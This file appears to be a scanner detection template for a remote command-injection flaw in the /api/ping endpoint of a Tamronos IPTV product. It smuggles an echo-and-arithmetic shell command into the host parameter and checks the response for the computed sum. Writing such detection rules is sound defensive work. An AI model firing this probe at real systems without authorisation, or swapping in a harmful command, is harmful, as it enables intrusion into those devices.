expression: r0()
id: tamronos-iptv-rce
info:
  author: Print1n
  name: Tamronos iptv rce
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      + r2)))
    request:
      method: GET
      path: /api/ping?count=5&host=;echo%20$(expr%20{{r1}}%20%2b%20{{r2}}):{{r1}}:{{r1}};&port=80&source=1.1.1.1&type=icmp
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
